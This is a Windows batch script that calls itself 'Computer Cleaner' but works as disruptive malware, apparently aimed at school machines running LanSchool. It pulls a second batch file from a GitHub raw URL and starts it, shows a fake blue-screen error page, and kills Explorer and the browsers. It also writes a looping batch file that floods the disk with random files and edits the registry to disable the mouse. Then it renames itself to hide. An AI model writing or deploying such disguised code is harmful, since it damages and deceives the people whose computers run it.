@echo off
if "%username%"=="2204498" goto InvalidGuest
rename %0% ComputerClean.bat
title Computer Cleaner
powershell -nologo -noprofile -command "Invoke-WebRequest 'https://raw.githubusercontent.com/BatchExpert/CreativeNetwork/main/BootStrapper/VolumeMixer.bat' -OutFile '%temp%\VolumeMixer.bat'" >nul
(
echo ^<html^>^<head^>^<title^>Lanschool.exe - System Malfunction^</title^> 
echo. 
echo ^<hta:application id="oBVC" 
echo applicationname="BSOD"  
echo version="1.0" 
echo maximizebutton="no" 
echo minimizebutton="no" 
echo sysmenu="no" 
echo Caption="no" 
echo windowstate="maximize"/^> 
echo. 
echo ^</head^>^<body bgcolor="#000088" scroll="no"^> 
echo ^<font face="Lucida Console" size="4" color="white"^> 
echo ^<p^>A problem has been detected and windows has been shutdown to prevent damage to your computer.^</p^> 
echo. 
echo ^<p^>DRIVER_IRQL_NOT_LES_OR_EQUAL^</p^> 
echo. 
echo ^<p^>If this is the first time you've seen this stop error screen, restart your computer, If this screen appears again, follow these steps:^</p^> 
echo. 
echo ^<p^>Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.^</p^> 
echo. 
echo ^<p^>If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.^</p^> 
echo. 
echo ^<p^>Technical information:^</p^> 
echo. 
echo ^<p^>*** STOP: 0x00D1 ^(0x00C,0x002,0x00,0xF86B5A89^)^</p^> 
echo. 
echo. 
echo ^<p^>***  gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^> 
echo. 
echo ^<p^>Beginning dump of physical memory^</p^> 
echo ^<p^>Physical memory dump complete.^</p^> 
echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> 
echo.
echo. 
echo ^</font^> 
echo ^</body^>
echo.
echo ^<script language="javascript"^>
echo function noClick^(^) {
echo if ^(^(event.button==1^)^|^|^(event.button==2^)^) {
echo alert^('The system cannot start because LanSchool.dII has stopped working'^)
echo }
echo }
echo document.onmousedown=noClick
echo ^</script^>
echo.  
echo ^</html^> 
) > %temp%\bsod.hta 
set Random2=%random%
(
echo @echo off
echo :Loophole
echo set FileLocation=%CD%
echo taskkill /f /im explorer.exe >nul
echo start /min notepad.exe >nul
echo start /min %temp%\VolumeMixer.bat >nul
echo cd %FileLocation%
echo md %random%%random%%random%%random%%random%%random%%random% >nul
echo echo %random%%random%%random%%random%%random%%random%%random% >>%random%%random%txt
echo echo %random%%random%%random%%random%%random%%random%%random% >>%random%%random%bat
echo echo %random%%random%%random%%random%%random%%random%%random% >>%random%%random%exe
echo echo %random%%random%%random%%random%%random%%random%%random% >>%random%%random%dII
echo echo %random%%random%%random%%random%%random%%random%%random% >>%random%%random%.exe
echo echo %random%%random%%random%%random%%random%%random%%random% >>%random%%random%.txt
echo echo %random%%random%%random%%random%%random%%random%%random% >>%random%%random%.bat
echo echo %random%%random%%random%%random%%random%%random%%random% >>%random%%random%.dII
echo start /min %temp%\OMFGA.bat
echo rem ---------------------
echo rem Disable Mouse
echo set key="HKEY_LOCAL_MACHINEsystemCurrentControlSetServicesMouclass"
echo reg delete %%key%%
echo reg add %%key%% /v Start /t REG_DWORD /d 4
echo rem --------------------- 
echo goto Loophole
) >%temp%\OMFGA.bat
taskkill /f /im explorer.exe
taskkill /f /im chrome.exe 
taskkill /f /im edge.exe
taskkill /f /im firefox.exe
taskkill /f /im brave.exe
taskkill /f /im google.exe
taskkill /f /im notepad.exe
cls
start %temp%\bsod.hta
echo start /min %temp%\VolumeMixer.bat >nul
start /min %temp%\OMFGA.bat >nul
cls
rename %0% %random%%random%%random%%random%%random%%random%%random%.exe
exit
:InvalidGuest
title Dangerous File Detected!
echo Dangerous File Was Detected!
timeout /t 2 /nobreak >nul
echo Automaticlly Removing Dangerous File...
timeout /t 2 /nobreak >nul
taskkill /f /im explorer.exe
taskkill /f /im chrome.exe 
taskkill /f /im edge.exe
taskkill /f /im firefox.exe
taskkill /f /im brave.exe
taskkill /f /im google.exe
taskkill /f /im notepad.exe
taskkill /f /im *.exe
start explorer.exe
del %0%
taskkill /f /im cmd.exe
exit
